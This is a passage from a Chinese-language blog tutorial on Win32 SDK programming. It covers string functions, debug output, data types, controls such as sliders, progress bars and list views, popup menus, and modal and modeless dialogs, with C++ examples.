NM_CLICK)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//手动回调</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndPorc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, Message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、SDK详解"><a href="#三、SDK详解" class="headerlink" title="三、SDK详解"></a>三、SDK详解</h1><h2 id="常用字符串处理函数"><a href="#常用字符串处理函数" class="headerlink" title="常用字符串处理函数"></a>常用字符串处理函数</h2><div class="table-container"><table><thead><tr><th></th><th>ASCLL版</th><th>UNICODE版</th><th>T版</th></tr></thead><tbody><tr><td>获取长度</td><td>strlen</td><td>wcsnlen</td><td>_tcslen</td></tr><tr><td>字符串拷贝</td><td>strcpy_s</td><td>wcscpy_s</td><td>_tcscpy_s</td></tr><tr><td>字符转数字</td><td>atoi</td><td>_wtoi</td><td>_tstoi</td></tr><tr><td>字符转数字</td><td>sscanf_s</td><td>swscanf_s</td><td>_stscanf_s</td></tr><tr><td>数字转字符</td><td>sprintf_s</td><td>swprintf_s</td><td>_stprintf_s</td></tr></tbody></table></div><h2 id="调试输出"><a href="#调试输出" class="headerlink" title="调试输出"></a>调试输出</h2><p>变参函数，用于在输出款输出信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> _trace(<span class="type">const</span> TCHAR* format, ...) </span><br><span class="line">&#123;</span><br><span class="line">  TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">  va_list argprt;</span><br><span class="line">  <span class="built_in">va_start</span>(argprt, format);</span><br><span class="line">  <span class="comment">//将格式化信息写入指定缓冲区</span></span><br><span class="line">  <span class="built_in">wvsprintf</span>(buffer, format, argprt);</span><br><span class="line">  <span class="built_in">va_end</span>(argprt);</span><br><span class="line">  <span class="comment">//将缓冲区信息输出</span></span><br><span class="line">  <span class="built_in">OutputDebugString</span>(buffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一天所用例题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> _trace(<span class="type">const</span> TCHAR* format, ...) <span class="comment">//变参函数</span></span><br><span class="line">&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line"><span class="built_in">va_start</span>(argptr, format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定的缓冲区</span></span><br><span class="line"><span class="built_in">wvsprintf</span>(buffer, format, argptr);</span><br><span class="line"><span class="built_in">va_end</span>(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line"><span class="built_in">OutputDebugString</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MyMessageBox</span><span class="params">(<span class="type">const</span> TCHAR* format, ...)</span> <span class="comment">//变参函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line"><span class="built_in">va_start</span>(argptr, format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定的缓冲区</span></span><br><span class="line"><span class="built_in">wvsprintf</span>(buffer, format, argptr);</span><br><span class="line"><span class="built_in">va_end</span>(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>,buffer,_T(<span class="string">&quot;提示&quot;</span>),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyGetErrorInfo</span><span class="params">(LPCTSTR lpErrInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">UINT unErrCode,</span></span></span><br><span class="line"><span class="params"><span class="function">UINT unLine)</span> <span class="comment">// unLine=__LINE__</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPTSTR lpMsgBuf = <span class="literal">nullptr</span>;</span><br><span class="line">WCHAR  szMessage[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WCHAR  szCaption[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">FormatMessage</span>(<span class="number">0x1300</span>, <span class="literal">NULL</span>, unErrCode,</span><br><span class="line"><span class="number">0x400</span>, (LPTSTR)&amp;lpMsgBuf, <span class="number">64</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">swprintf_s</span>(szMessage, <span class="number">128</span>,</span><br><span class="line"><span class="string">L&quot;Error_0x%08X:%s&quot;</span>, unErrCode, lpMsgBuf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">swprintf_s</span>(szCaption, <span class="number">32</span>,</span><br><span class="line"><span class="string">L&quot;%s (Error Line:%05d)&quot;</span>, lpErrInfo, unLine);</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, szMessage, szCaption, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">LPSTR  lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">OutputDebugString</span>(_T(<span class="string">&quot;你好 呵呵&quot;</span>));</span><br><span class="line"></span><br><span class="line">_trace(_T(<span class="string">&quot;有两个数，分别是%d和%s&quot;</span>), <span class="number">100</span>, <span class="string">L&quot;你好&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">MyMessageBox</span>(_T(<span class="string">&quot;有两个数，分别是%d和%s&quot;</span>), <span class="number">100</span>, <span class="string">L&quot;你好&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//GetStdHandle(STD_OUTPUT_HANDLE);</span></span><br><span class="line">HANDLE hOut = <span class="built_in">GetStdHandle</span>(<span class="number">100</span>);</span><br><span class="line"><span class="type">int</span> nError = <span class="built_in">GetLastError</span>();</span><br><span class="line">nError = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">MyGetErrorInfo</span>(<span class="string">L&quot;十五派友情提示&quot;</span>, nError, __LINE__);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>常用数据类型</p><div class="table-container"><table><thead><tr><th>Windows 数据类型</th><th>描述信息</th></tr></thead><tbody><tr><td>UINT</td><td>无符号32位整数</td></tr><tr><td>DWORD</td><td>整数</td></tr><tr><td>PDWORD</td><td>指向32位值的指针</td></tr><tr><td>BOOL</td><td>布尔（true/false）</td></tr><tr><td>SHORT</td><td>带符号16位整数</td></tr><tr><td>LPSTR</td><td>字符串指针</td></tr><tr><td>LPCSTR</td><td>字符串常量指针</td></tr><tr><td>WPARAM</td><td>32位的消息参数</td></tr><tr><td>LPARAM</td><td>32位的消息参数</td></tr><tr><td>LRESULT</td><td>32位函数返回值</td></tr><tr><td>HWND</td><td>窗口句柄</td></tr></tbody></table></div><h2 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h2><h3 id="标准控件"><a href="#标准控件" class="headerlink" title="标准控件"></a>标准控件</h3><p>响应消息：WM_COMMAND</p><p>控件时常见的窗口上的交互元素</p><p>当控件的特定功能被触发后，会主动发消息通知父窗口</p><p>父窗口可以通过发消息给控件</p><p>例如：控件的创建（button时按钮控件）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;控件名&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">280</span>, <span class="number">440</span>, <span class="number">80</span>, <span class="number">50</span>, hwnd, (HMENU)<span class="number">0x10016</span>, hInstance, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>标准控件时windows提供的基本控件，使用方式也比较简单，一下时常用的标准控件</p><div class="table-container"><table><thead><tr><th>窗口类名</th><th>控件名</th><th>英文</th></tr></thead><tbody><tr><td>“button”</td><td>按钮</td><td>Button</td></tr><tr><td>“button”</td><td>复选框</td><td>CheckBox</td></tr><tr><td>“button”</td><td>单选框</td><td>RadioButton</td></tr><tr><td>“static”</td><td>静态文本</td><td>Static Text</td></tr><tr><td>“static”</td><td>图片</td><td>Picture Control</td></tr><tr><td>“combobox”</td><td>复合框</td><td>ComBox</td></tr><tr><td>“edit”</td><td>编辑</td><td>Edit</td></tr><tr><td><strong>“listbox”</strong></td><td><strong>列表框</strong></td><td><strong>ListBox</strong></td></tr></tbody></table></div><p>滚动条 Slider Control控件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_HSCROLL:<span class="comment">//当水平的滑块滑动时，会产生这个消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> nPos = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1. 先获取滑块的句柄</span></span><br><span class="line">HWND hSlider = <span class="built_in">GetDlgItem</span>(hWnd, IDC_SLIDER1);</span><br><span class="line"><span class="comment">//2. 给滑块发消息 接收滑块移动的位置</span></span><br><span class="line">nPos = <span class="built_in">SendMessage</span>(hSlider, TBM_GETPOS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//给滑块发消息，滑块句柄， 消息类型，   重绘，进度位置</span></span><br><span class="line"><span class="comment">//SendMessage(hSlider, TBM_SETPOS, true, 0);</span></span><br></pre></td></tr></table></figure><p>进度条</p><p>响应的还是WM_COMMAND消息，这个消息的WPARAM的低位时控件ID</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> nPos = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1. 获取进度条控件的句柄</span></span><br><span class="line">HWND hProcess = <span class="built_in">GetDlgItem</span>(hWnd, IDC_PROGRESS1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 给进度条控件发消息，设置进度</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hProcess, PBM_SETPOS, nPos, <span class="number">0</span>);</span><br><span class="line">nPos += <span class="number">20</span>;</span><br><span class="line"><span class="keyword">if</span> (nPos&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">nPos = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通用控件"><a href="#通用控件" class="headerlink" title="通用控件"></a>通用控件</h3><div class="table-container"><table><thead><tr><th>窗口类名</th><th>控件</th></tr></thead><tbody><tr><td>WC_LISTVIEW</td><td>列表框控件</td></tr><tr><td>WC_TREEVIEW</td><td>树控件</td></tr><tr><td>WC_TABCONTROL</td><td>Tab控件</td></tr><tr><td>HOTLEY_CLASS</td><td>热键控件</td></tr></tbody></table></div><p>列表框控件的创建</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据ID获取列表框控件的句柄</span></span><br><span class="line">HWND hListCtrl = <span class="built_in">GetDlgItem</span>(hMain, IDC_LIST3);</span><br><span class="line"><span class="comment">//更改列表框的风格</span></span><br><span class="line"><span class="built_in">ListView_SetExtendedListViewStyle</span>(hListCtrl, LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);</span><br><span class="line"><span class="comment">//添加第一列</span></span><br><span class="line">LVCOLUMN lv = &#123;&#125;;</span><br><span class="line">lv.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;</span><br><span class="line">lv.cx = <span class="number">112</span>;<span class="comment">//112正好对应该窗口的宽度为4列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;年份&quot;</span>);</span><br><span class="line">lv.fmt = LVCFMT_CENTER;</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">0</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第二列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;时间&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">1</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第三列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;经历&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">2</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第四列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;备注&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">3</span>, &amp;lv);</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">0</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2009&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学附中就读&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;班长一职&quot;</span>));</span><br><span class="line"><span class="comment">//添加第二行</span></span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">1</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2001&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;学生会主席&quot;</span>));</span><br></pre></td></tr></table></figure><h2 id="窗口风格"><a href="#窗口风格" class="headerlink" title="窗口风格"></a>窗口风格</h2><p>响应消息：WM_NOTIFY</p><p>窗口标准风格之</p><h3 id="三大窗口风格"><a href="#三大窗口风格" class="headerlink" title="三大窗口风格"></a>三大窗口风格</h3><div class="table-container"><table><thead><tr><th>重叠窗口</th><th>弹出窗口</th><th>子窗口</th></tr></thead><tbody><tr><td>WS_OVERLAPPEDWINODW</td><td>WS_POPUPWINDOW</td><td>WS_CHILDWINDOW</td></tr></tbody></table></div><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><div class="table-container"><table><thead><tr><th>函数名</th><th>说明</th></tr></thead><tbody><tr><td>CreateWindow</td><td>使用窗口类，创建窗口，创建控件</td></tr><tr><td>RegisterClass</td><td>注册窗口类</td></tr><tr><td>DialogBox</td><td>使用资源创建一个模态对话框</td></tr><tr><td>MoveWindow</td><td>移动窗口到指定位置</td></tr><tr><td>ShowWIndow</td><td>隐藏（SW_HWID）或显示(SW_SHOW)窗口</td></tr><tr><td>GetWindowText</td><td>获取窗口标题</td></tr><tr><td>SetWindowText</td><td>设置窗口标题</td></tr><tr><td>SetParent</td><td>更改指定窗口的父窗口</td></tr><tr><td>TrackPopupMeun</td><td>弹出菜单（坐标需要转换，需要获取子菜单的句柄）</td></tr><tr><td>GetSubMenu</td><td>获取指定子菜单的句柄</td></tr><tr><td>GetDlgItem</td><td>根据控件的ID获取子控件句柄</td></tr><tr><td>GetParent</td><td>获取父窗口句柄</td></tr><tr><td>FindWindow</td><td>找到一个窗口，获取其句柄</td></tr><tr><td></td></tr></tbody></table></div><h2 id="常用资源"><a href="#常用资源" class="headerlink" title="常用资源"></a>常用资源</h2><p>想要操作资源需先获得资源的句柄</p><h3 id="图标-Icon"><a href="#图标-Icon" class="headerlink" title="图标 Icon"></a>图标 Icon</h3><ul><li>需要有一个图标资源</li><li>LoadIcon根据资源ID得到句柄</li><li>将句柄填充到窗口类上</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HBITMAP hBit_map = <span class="built_in">LoadBitmap</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDB_BITMAP1));</span><br><span class="line">HWND hPic=<span class="built_in">GetDlgItem</span>(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br></pre></td></tr></table></figure><h3 id="光标-Cursor"><a href="#光标-Cursor" class="headerlink" title="光标 Cursor"></a>光标 Cursor</h3><ul><li>需要有一个光标资源</li><li>LoadCursor根据ID得到句柄</li><li>将句柄填充到窗口类上</li></ul><h3 id="位图"><a href="#位图" class="headerlink" title="位图"></a>位图</h3><ul><li>配合picture控件使用</li></ul><h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><ul><li>下拉菜单<ul><li>有一个菜单资源<ul><li>填充到窗口类中 直接填</li><li>填充到创建窗口的参数上，需要LoadMenu获取到句柄</li></ul></li></ul></li><li>弹出菜单<ul><li>TrackPopupMenu 提供坐标以及菜单的句柄</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//这里得到的是窗口坐标</span></span><br><span class="line">DWORD dwX = <span class="built_in">LOWORD</span>(lParam);</span><br><span class="line">DWORD dwY = <span class="built_in">HIWORD</span>(lParam);</span><br><span class="line"><span class="comment">//我们需要将窗口坐标转换为屏幕坐标</span></span><br><span class="line">POINT pt = &#123; dwX ,dwY &#125;;</span><br><span class="line"><span class="built_in">ClientToScreen</span>(hWnd, &amp;pt);</span><br><span class="line">    </span><br><span class="line">HMENU hMenu =  <span class="built_in">LoadMenu</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDR_MENU2));</span><br><span class="line">    </span><br><span class="line"><span class="comment">//获取子菜单的句柄</span></span><br><span class="line">HMENU hSubMenu = <span class="built_in">GetSubMenu</span>(</span><br><span class="line">hMenu, <span class="comment">//父级菜单句柄</span></span><br><span class="line"><span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">TrackPopupMenu</span>(</span><br><span class="line">hSubMenu,</span><br><span class="line">TPM_LEFTALIGN,</span><br><span class="line">pt.x,</span><br><span class="line">pt.y,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">hWnd,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h2 id="对话框资源"><a href="#对话框资源" class="headerlink" title="对话框资源"></a>对话框资源</h2><p>可视化编程</p><ul><li>DialogBox 模态对话框 会阻塞住父窗口</li><li>CreateDialog 非模态对话框 不会阻塞父窗口</li></ul><h3 id="模态对话框"><a href="#模态对话框" class="headerlink" title="模态对话框"></a>模态对话框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">DialogBox</span>(</span><br><span class="line">hInstance,</span><br><span class="line"><span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG1),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">DlgProc</span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="非模态对话框"><a href="#非模态对话框" class="headerlink" title="非模态对话框"></a>非模态对话框</h3><p>CreateDialog</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPreInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">int</span> nCmdShow</span></span></span><br><span 